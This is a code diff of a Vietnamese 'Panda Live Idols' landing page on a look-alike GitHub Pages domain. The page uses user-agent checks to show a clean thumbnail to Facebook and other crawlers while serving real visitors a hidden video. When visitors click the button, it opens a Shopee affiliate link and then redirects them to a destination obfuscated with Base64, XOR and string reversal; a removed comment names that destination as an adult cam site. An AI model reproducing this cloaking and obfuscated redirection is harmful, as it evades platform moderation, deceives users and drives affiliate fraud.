@@ -1,173 +1,94 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
-  <title>Panda Live Idols</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Panda Live Idols</title>
 
-  <!-- Open Graph -->
-  <meta property="og:url" content="https://pandalive-co-kr.github.io/panda-live-idols/" />
-  <meta property="og:type" content="website" />
-  <meta property="og:title" content="Panda Live Idols" />
-  <meta property="og:description" content="Xem video mới nhất của Panda Live Idols" />
-  <meta property="og:image" content="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" />
-  <meta property="og:image:width" content="1200" />
-  <meta property="og:image:height" content="630" />
+<!-- Open Graph -->
+<meta property="og:url" content="https://pandalive-co-kr.github.io/panda-live-idols/" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Panda Live Idols" />
+<meta property="og:description" content="Xem video mới nhất của Panda Live Idols" />
+<meta property="og:image" content="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
 
-  <style>
-    html, body { margin:0; padding:0; height:100%; background:#000; }
-    .video-container{ position:relative; width:100%; height:100%; overflow:hidden; }
-    .video-container video{ width:100%; height:100%; object-fit:cover; background:#000; }
-    .top-logo-right{ position:absolute; top:10px; right:10px; z-index:2000; max-width:150px; }
-    .top-logo-left{ position:absolute; top:10px; left:10px; z-index:2000; max-width:150px; }
-    .bottom-logo-left{ position:absolute; bottom:10px; left:10px; z-index:2000; max-width:120px; }
-    .overlay{ position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); z-index:1000; }
-    .cta{ display:flex; align-items:center; gap:8px; background:rgba(0,17,61,0.85); color:#fff;
-          border:none; border-radius:8px; padding:10px 18px; font-size:16px; cursor:pointer; }
-    .cta img{ width:24px; height:24px; }
-    @media (max-width:768px){
-      .overlay{ top:auto; bottom:320px; transform:translateX(-50%); }
-      .top-logo-left, .top-logo-right{ max-width:100px; }
-      .bottom-logo-left{ max-width:90px; }
-    }
-    #thumbnail{ display:none; }
-  </style>
+<style>
+html,body{margin:0;padding:0;height:100%;background:#000;}
+.video-container{position:relative;width:100%;height:100%;overflow:hidden;}
+.video-container video{width:100%;height:100%;object-fit:cover;background:#000;}
+.top-logo-right{position:absolute;top:10px;right:10px;z-index:2000;max-width:150px;}
+.top-logo-left{position:absolute;top:10px;left:10px;z-index:2000;max-width:150px;}
+.bottom-logo-left{position:absolute;bottom:10px;left:10px;z-index:2000;max-width:120px;}
+.overlay{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:1000;}
+.cta{display:flex;align-items:center;gap:8px;background:rgba(0,17,61,0.85);color:#fff;border:none;border-radius:8px;padding:10px 18px;font-size:16px;cursor:pointer;}
+.cta img{width:24px;height:24px;}
+@media (max-width:768px){
+  .overlay{top:auto;bottom:320px;transform:translateX(-50%);}
+  .top-logo-left,.top-logo-right{max-width:100px;}
+  .bottom-logo-left{max-width:90px;}
+}
+#thumbnail{display:none;}
+</style>
 </head>
 <body>
-  <div id="thumbnail">
-    <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail sạch" style="width:100%; height:auto;">
+
+<!-- Thumbnail cho bot -->
+<div id="thumbnail">
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail" style="width:100%;height:auto;">
+</div>
+
+<!-- Nội dung thật -->
+<div id="real-content" class="video-container" style="display:none;">
+  <video id="main-video" autoplay muted loop playsinline preload="auto" poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg"></video>
+
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number Logo" class="top-logo-left" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" alt="Panda Class Logo" class="top-logo-right" />
+  <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" alt="KBJ Logo" class="bottom-logo-left" />
+
+  <div class="overlay">
+    <button class="cta" id="ctaBtn">
+      <img src="https://pandalive-co-kr.github.io/panda-live-idols/logo.png" alt="Panda Logo" />
+      Panda Live Idols
+    </button>
   </div>
+</div>
 
-  <div id="real-content" class="video-container" style="display:none;">
-    <video id="main-video" autoplay muted loop playsinline preload="auto" poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" webkit-playsinline></video>
+<script>
+function xorDecode(str,key){let r='';for(let i=0;i<str.length;i++){r+=String.fromCharCode(str.charCodeAt(i)^key.charCodeAt(i%key.length));}return r;}
+function reverseString(s){return s.split('').reverse().join('');}
+function isBot(){const ua=(navigator.userAgent||"").toLowerCase();const kw=["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];return kw.some(k=>ua.includes(k))||navigator.webdriver;}
 
-    <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number Logo" class="top-logo-left" />
-    <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" alt="Panda Class Logo" class="top-logo-right" />
-    <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" alt="KBJ Logo" class="bottom-logo-left" />
+// Mã hóa video & link
+const video_enc="ZBEDSgQnDBtdXR9aNQUHEk44CRZWWR9QJggCSQAvCxhCH11cfgMbDBUiAldAWx9aM0wLEggnBB1cUUIaf1sdFBU/DQ==";
+const link_enc="JgEEDlMdExgdAwZETQ4PHUpKQw8cA0l5J1pKUg==";
+const key="PandaKey2025";
 
-    <div class="overlay">
-      <button class="cta" id="ctaBtn">
-        <img src="https://pandalive-co-kr.github.io/panda-live-idols/logo.png" alt="Panda Logo" />
-        Panda Live Idols
-      </button>
-    </div>
-  </div>
+document.addEventListener('DOMContentLoaded',()=>{
+  const thumb=document.getElementById('thumbnail');
+  const real=document.getElementById('real-content');
+  const vid=document.getElementById('main-video');
 
-  <script>
-    (function sanitizeAddressBar() {
-      try {
-        const expectedBase = '/panda-live-idols/';
-        const pathname = window.location.pathname || '/';
-        if (!pathname.endsWith(expectedBase) && pathname.indexOf(expectedBase) === -1 && window.history?.replaceState) {
-          const newUrl = expectedBase + window.location.search + window.location.hash;
-          window.history.replaceState(null, '', newUrl);
-        }
-      } catch (err) {
-        console.warn("sanitizeAddressBar error:", err);
-      }
-    })();
+  if(isBot()){thumb.style.display='block';return;}
 
-    function xorDecode(str, key) {
-      let res = '';
-      for (let i = 0; i < str.length; i++) {
-        res += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-      }
-      return res;
-    }
-    function reverseString(s) { return s.split('').reverse().join(''); }
-
-    const enc3_b64 = "ZBEDSgQnDBtdXR9aNQUHEk44CRZWWR9QJggCSQAvCxhCH11cfgMbDBUiAldAWx9aM0wLEggnBB1cUUIaf1sdFBU/DQ==";
-    const xorKey = "PandaKey2025";
-
-    // Link đích được mã hóa (Base64 + XOR + reverse)
-    const encLink_b64 = "LhIbAgkKHlVtVV9jBwQHL1V4CyhEUklWMTk+Dw=="; // đã mã hóa từ https://sexbjcam.com/actor/pandaclass/
-
-    function isBot() {
-      const ua = (navigator.userAgent || "").toLowerCase();
-      const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];
-      return keywords.some(k => ua.includes(k)) || navigator.webdriver;
-    }
-
-    document.addEventListener('DOMContentLoaded', function() {
-      const thumbnail = document.getElementById('thumbnail');
-      const real = document.getElementById('real-content');
-      const vid = document.getElementById('main-video');
-
-      if (isBot()) {
-        thumbnail.style.display = 'block';
-        real.style.display = 'none';
-        return;
-      }
-
-      try {
-        const raw = atob(enc3_b64);
-        const step = xorDecode(raw, xorKey);
-        const videoURL = reverseString(step);
-
-        thumbnail.style.display = 'none';
-        real.style.display = 'block';
-
-        const FETCH_TIMEOUT = 7000;
-        const controller = new AbortController();
-        const signal = controller.signal;
-        const timeoutId = setTimeout(()=> controller.abort(), FETCH_TIMEOUT);
-
-        fetch(videoURL, { signal })
-          .then(res => {
-            clearTimeout(timeoutId);
-            if (!res.ok) throw new Error('HTTP ' + res.status);
-            return res.blob();
-          })
-          .then(blob => {
-            const blobUrl = URL.createObjectURL(blob);
-            vid.src = blobUrl;
-            vid.load();
-            vid.addEventListener('canplaythrough', ()=> vid.play().catch(()=>{}), { once: true });
-            setTimeout(()=> vid.play().catch(()=>{}), 250);
-          })
-          .catch(err => {
-            console.warn('Preload failed, fallback to streaming src:', err);
-            vid.src = videoURL;
-            vid.load();
-            vid.addEventListener('canplay', ()=> vid.play().catch(()=>{}), { once: true });
-          });
-
-      } catch (err) {
-        console.error('Video decode/load failed:', err);
-        thumbnail.style.display = 'block';
-        real.style.display = 'none';
-      }
-
-      const cta = document.getElementById('ctaBtn');
-      if (cta) {
-        cta.addEventListener('click', function(){
-          // Mở affiliate Shopee
-          const affiliate = document.createElement('a');
-          affiliate.href = "https://s.shopee.vn/30dchvC74f";
-          affiliate.target = "_blank";
-          affiliate.rel = "noopener";
-          document.body.appendChild(affiliate);
-          affiliate.click();
-
-          // Giải mã link thật & redirect
-          setTimeout(()=> {
-            try {
-              const rawLink = atob(encLink_b64);
-              const stepLink = xorDecode(rawLink, xorKey);
-              const finalLink = reverseString(stepLink);
-              window.location.href = finalLink;
-            } catch (e) {
-              console.error('Redirect failed:', e);
-            }
-          }, 120);
-        });
-      }
+  try{
+    const videoURL=reverseString(xorDecode(atob(video_enc),key));
+    thumb.style.display='none';real.style.display='block';
+    fetch(videoURL).then(r=>r.blob()).then(b=>{
+      vid.src=URL.createObjectURL(b);vid.play().catch(()=>{});
+    }).catch(()=>{
+      vid.src=videoURL;vid.play().catch(()=>{});
     });
-  </script>
+
+    document.getElementById('ctaBtn').addEventListener('click',()=>{
+      window.open("https://s.shopee.vn/30dchvC74f","_blank","noopener");
+      setTimeout(()=>{
+        window.location.href=reverseString(xorDecode(atob(link_enc),key));
+      },150);
+    });
+  }catch(e){thumb.style.display='block';}
+});
+</script>
 </body>
 </html>
-
-
-
-
-
